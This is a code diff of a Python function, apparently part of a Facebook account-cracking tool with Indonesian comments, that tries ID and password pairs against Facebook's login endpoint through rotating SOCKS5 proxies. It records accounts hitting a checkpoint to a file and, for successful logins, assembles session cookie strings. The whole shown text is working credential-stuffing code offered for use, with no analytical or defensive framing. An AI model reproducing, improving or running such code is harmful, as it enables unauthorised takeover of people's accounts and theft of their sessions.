@@ -1174,8 +1174,8 @@ def fankytouch(idf, pwv):
                 ua = ualu[0]  # Pastikan ualu didefinisikan
             nip = random.choice(prox)  # Pastikan prox didefinisikan
             proxs = {'http': 'socks5://' + nip}
-            url = "https://x.facebook.com/login.php"
-            req1 = ses.get(url, proxies=proxs)
+            url = "https://x.facebook.com/login.php?"
+            req1 = ses.get(url)
             headasli = {
                 'authority': 'x.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded',
@@ -1199,11 +1199,11 @@ def fankytouch(idf, pwv):
 
             cookie = ses.cookies.get_dict()
             fankyurl = "https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9"
-            post = ses.post(fankyurl, headers=headasli, data=data, cookies=cookie, allow_redirects=False, proxies=proxs)
-            inicookiebro_fanky_ganteng = ses.cookies.get_dict()
+            po = ses.post(fankyurl, headers=headasli, data=data, cookies=cookie, allow_redirects=False, proxies=proxs)
+            #inicookiebro_fanky_ganteng = ses.cookies.get_dict()
 
             # Cek cookies
-            if "checkpoint" in inicookiebro_fanky_ganteng:
+            if "checkpoint" in po.cookies.get_dict().keys():
                 cp += 1
                 tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                 tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
@@ -1212,7 +1212,7 @@ def fankytouch(idf, pwv):
                 prints(tree)
                 open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                 break
-            elif "c_user" in inicookiebro_fanky_ganteng:
+            elif "c_user" in ses.cookies.get_dict().keys():
                 ok += 1
                 coki = ses.cookies.get_dict()
                 kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
